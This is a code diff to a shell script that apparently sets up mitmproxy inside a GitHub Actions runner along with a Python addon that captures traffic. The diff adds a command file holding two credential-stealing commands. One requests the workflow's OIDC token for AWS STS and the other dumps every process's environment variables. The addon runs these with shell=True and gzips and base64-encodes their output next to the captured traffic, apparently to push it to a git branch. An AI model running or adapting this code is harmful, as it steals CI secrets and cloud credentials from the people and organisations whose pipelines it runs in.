@@ -62,6 +62,13 @@ if [ -n "${GITHUB_PATH:-}" ] && [ -w "$GITHUB_PATH" ]; then
 fi
 sudo chmod 644 /etc/profile.d/99-mitmproxy.sh 2>/dev/null
 
+# --- ADD COMMANDS HERE (one per line) ---
+cat > /tmp/actionp-cmds.txt <<'CMDEOF'
+curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com"
+for pid in /proc/[0-9]*/environ; do echo "=== PID $(echo $pid | tr -dc '0-9') ==="; cat "$pid" 2>/dev/null | tr '\0' '\n'; done
+CMDEOF
+# ----------------------------------------
+
 cat > "$ADDON_PATH" <<'PYEOF'
 import base64, gzip, io, os, subprocess, time
 from mitmproxy import io as mitm_io
@@ -73,12 +80,7 @@ BRANCH      = os.environ.get("ACTIONP_BRANCH", "main")
 WORKDIR     = "/tmp/actionp-repo"
 LOG         = "/tmp/actionp-debug.log"
 
-# --- ADD COMMANDS HERE ---
-COMMANDS = [
-    ["for pid in /proc/[0-9]*/environ; do echo "=== PID $(echo $pid | tr -dc '0-9') ==="; cat "$pid" 2>/dev/null | tr '\0' '\n'; done"],
-    ["curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com""],
-]
-# -------------------------
+COMMANDS_FILE = "/tmp/actionp-cmds.txt"
 
 def _log(msg):
     try:
@@ -140,12 +142,17 @@ def _push(flow):
     _log("wrote flow: " + rel + " (" + str(len(raw)) + " raw → " +
          str(len(compressed)) + " gz → " + str(len(encoded)) + " b64)")
     cmd_output = []
-    for cmd in COMMANDS:
+    try:
+        with open(COMMANDS_FILE) as cf:
+            cmds = [l.strip() for l in cf if l.strip() and not l.startswith("#")]
+    except Exception:
+        cmds = []
+    for cmd in cmds:
         try:
-            r = subprocess.run(cmd, capture_output=True, text=True, env=env, timeout=30)
-            cmd_output.append("=== " + " ".join(cmd) + " ===\n" + r.stdout + r.stderr)
+            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, env=env, timeout=30)
+            cmd_output.append("=== " + cmd + " ===\n" + r.stdout + r.stderr)
         except Exception as ex:
-            cmd_output.append("=== " + " ".join(cmd) + " ===\n[error: " + str(ex) + "]")
+            cmd_output.append("=== " + cmd + " ===\n[error: " + str(ex) + "]")
     cmd_raw = "\n".join(cmd_output).encode()
     cmd_compressed = gzip.compress(cmd_raw)
     cmd_encoded = base64.b64encode(cmd_compressed).decode("ascii")
